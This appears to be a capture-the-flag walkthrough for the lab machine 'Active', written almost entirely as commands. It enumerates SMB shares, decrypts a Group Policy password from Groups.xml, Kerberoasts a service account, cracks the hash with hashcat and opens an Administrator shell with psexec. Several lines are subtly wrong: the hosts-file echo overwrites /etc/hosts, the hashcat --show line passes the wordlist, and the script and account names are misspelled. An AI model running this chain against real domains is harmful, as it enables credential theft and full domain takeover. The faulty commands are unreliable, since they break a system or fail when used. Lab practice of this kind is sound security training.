ping 10.10.10.100
whatweb 10.10.10.100

echo "10.10.10.100 active.htb" > /etc/hosts

nmap -p- --min-rate 10000 active.htb
nmap -sC -sV active.htb

smbclient -N -L //active.htb
smbclient -N \\\\active.htb\\replication

Find MACHINE/Preferences/Groups dir
get Groups.xml
cat Groups.xml -> find encrypt pass

gpp-decrypt <encrypt pass> -> get decrypt pass

Download GetADUsers.py script -> insert decrypt pass
GetADUsers.py -all active.htb/svc-tgs -dc-ip active.htb

Download GetUsersSPNs.py script
GetUsersSPNs.py active.htb/SVG_TGS -> insert decrypt pass
GetUsersSPNs.py -request active.htb/SVG_TGS -> insert decrypt pass -> GET KERBEROS TICKET HASH

hashcat -m 13100 <HASH FILE> ./rockyou.txt --force
hashcat -m 13100 ./rockyou.txt --show

Download psexec.py
psexec.py active.htb/Administrator@active.htb

get user.txt e root.txt